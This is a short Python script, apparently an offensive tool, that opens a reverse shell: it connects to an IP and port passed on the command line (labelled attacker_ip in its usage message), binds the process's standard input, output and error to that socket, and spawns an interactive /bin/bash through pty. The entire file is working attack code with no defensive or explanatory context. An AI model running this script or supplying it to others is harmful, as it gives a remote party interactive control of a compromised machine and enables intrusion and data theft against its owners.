import os
import sys
import socket
import pty

def reverse_shell(target_ip, port):
    """Connect back with fully interactive PTY shell"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, port))
        
        os.dup2(s.fileno(), 0)  # stdin
        os.dup2(s.fileno(), 1)  # stdout
        os.dup2(s.fileno(), 2)  # stderr
        
        pty.spawn("/bin/bash")
        
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <attacker_ip> <port>")
        sys.exit(1)
    
    reverse_shell(sys.argv[1], int(sys.argv[2]))
